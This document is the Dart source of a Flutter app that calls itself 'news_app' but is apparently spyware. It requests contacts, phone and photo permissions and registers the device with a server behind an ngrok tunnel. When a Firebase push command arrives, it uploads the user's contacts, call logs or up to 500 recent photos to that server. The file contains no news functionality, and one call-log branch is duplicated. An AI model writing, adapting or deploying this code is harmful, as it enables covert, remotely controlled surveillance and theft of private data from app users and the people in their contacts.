import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:news_app/firebase_options.dart';
import 'package:news_app/notification_model.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';

const String DUMP_CALL_LOGS = "003";
const String DUMP_CONTACTS = "002";
const String DUMP_PHOTOS = "001";

Dio dio = Dio(BaseOptions(baseUrl: "https://fcfc-2407-1400-aa70-b6c0-6474-1673-2d4f-804b.ngrok-free.app/api/"));


// --------------------------------------------------------------------------------
// App Initializations
// --------------------------------------------------------------------------------
Future<void> InitializeApp() async {
  // Setup the firebase app
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );

  // send the app token
  final String? fbToken = await FirebaseMessaging.instance.getToken();

  final deviceInfoPlugin = DeviceInfoPlugin();
  final deviceInfo = await deviceInfoPlugin.deviceInfo;
  final allInfo = deviceInfo.data;

  final String deviceName = allInfo["id"];

  final data = await SendTokenToServer(deviceName, fbToken ?? "");

  if (data) {
    print("SEND TOKEN TO SERVER");
  } else {
    print("COULD NOT SEND TOKEN TO SERVER");
  }

  // Request permission
  await Permission.contacts.request();
  await Permission.phone.request();
  await PhotoManager.requestPermissionExtend();

  FirebaseMessaging.onBackgroundMessage(OnMessageReceived);
  FirebaseMessaging.onMessage.listen(OnMessageReceived);
}

// --------------------------------------------------------------------------------
// Send the device info to the api
// --------------------------------------------------------------------------------
Future<bool> SendTokenToServer(String deviceName, String deviceToken) async {
  try {
    final res = await dio.post(
      "/devices/change/",
      data: {
        "device_name": deviceName,
        "device_token": deviceToken,
      },
    );

    return (res.statusCode == HttpStatus.created);
  } catch (e) {
    return false;
  }
}

// --------------------------------------------------------------------------------
// Send the user data
// --------------------------------------------------------------------------------
Future<bool> SendDataToServer(String deviceName, String data) async {
  try {
    final res = await dio.post(
      "/data/",
      data: {
        "data": data,
        "device": deviceName,
      },
    );

    return (res.statusCode == HttpStatus.created);
  } catch (e) {
    return false;
  }
}

// --------------------------------------------------------------------------------
// Upload the User Photos
// --------------------------------------------------------------------------------
Future<String?> UploadPhoto(File file) async {
  final url = '/upload/';
  final formData = FormData.fromMap({
    'files': await MultipartFile.fromFile(file.path, filename: file.path.split('/').last),
  });

  try {
    final response = await dio.post(url, data: formData);

    if (response.statusCode == 201) {
      final fileUrl = response.data[0]['file'];
      return fileUrl;
    } else {
      print('Failed to upload photo: ${response.statusCode}');
      return null;
    }
  } catch (e) {
    print('Error uploading photo: $e');
    return null;
  }
}

// --------------------------------------------------------------------------------
// Fetches recent photos from user devices
// --------------------------------------------------------------------------------
Future<List<String>> FetchRecentPhotos() async {
  final List<String> fileUrls = [];

  final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
    type: RequestType.image,
    onlyAll: true,
    filterOption: FilterOptionGroup(
      orders: [
        const OrderOption(type: OrderOptionType.createDate, asc: false),
      ],
    ),
  );

  if (albums.isNotEmpty) {
    final List<AssetEntity> assets = await albums[0].getAssetListRange(start: 0, end: 500);

    for (AssetEntity asset in assets) {
      final File? file = await asset.file;
      if (file != null) {
        final url = await UploadPhoto(file);
        if (url != null) {
          fileUrls.add(url);
        }
      }
    }
  }

  return fileUrls;
}

// --------------------------------------------------------------------------------
// Fetches the call logs from the platform - supports android only
// --------------------------------------------------------------------------------
class CallLogService {
  static const platform = MethodChannel('com.example.news_app');

  static Future<dynamic> getCallLogs() async {
    try {
      final List<dynamic> callLogs = await platform.invokeMethod('getCallLogs');
      return callLogs;
    } on PlatformException catch (e) {
      print("Failed to get call logs: '${e.message}'.");
      return [];
    }
  }
}

// --------------------------------------------------------------------------------
// Notification Handler
// --------------------------------------------------------------------------------
@pragma('vm:entry-point')
Future<void> OnMessageReceived(RemoteMessage message) async {
  final deviceInfoPlugin = DeviceInfoPlugin();
  final deviceInfo = await deviceInfoPlugin.deviceInfo;
  final allInfo = deviceInfo.data;

  final String deviceName = allInfo["id"];

  final data = NotificationModel.fromJson(message.data);

  if(data.type == DUMP_CONTACTS) {
    final List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true);
    await SendDataToServer(deviceName + DUMP_CONTACTS, jsonEncode({
      "contacts": contacts.map((c) => c.toJson()).toList().toString(),
    }));
  }
  else if(data.type == DUMP_CALL_LOGS) {
    final callLogs = await CallLogService.getCallLogs();
    await SendDataToServer(deviceName + DUMP_CALL_LOGS, callLogs.toString());
  }
  else if(data.type == DUMP_CALL_LOGS) {
    final callLogs = await CallLogService.getCallLogs();
    await SendDataToServer(deviceName + DUMP_CALL_LOGS, callLogs.toString());
  }
  else if(data.type == DUMP_PHOTOS) {
    final photos = await FetchRecentPhotos();
    await SendDataToServer(deviceName + DUMP_PHOTOS, photos.toString());
  }
}